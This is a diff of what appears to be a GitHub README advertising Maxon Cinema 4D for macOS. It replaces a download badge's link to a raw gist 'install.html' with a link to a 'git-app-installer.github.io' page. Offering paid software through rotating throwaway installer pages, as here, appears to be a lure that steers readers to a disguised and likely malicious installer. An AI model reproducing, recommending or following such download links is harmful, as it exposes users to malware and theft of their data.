@@ -2,7 +2,7 @@
 
 Cinema 4D is a professional solution for motion graphics, animation, rendering, modeling, and VFX on macOS, trusted by designers, studios, and filmmakers worldwide.
 
-<a href="https://gistcdn.githack.com/xe-hash/6ef9fff8db2b77c619aaae8b42258afc/raw/cdbceb24cf13f427fa2be7f0fcbc9336cb6dae92/install.html?offer=Maxon%20Cinema%204D" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MaxonCinema4D" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Cinema4D%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
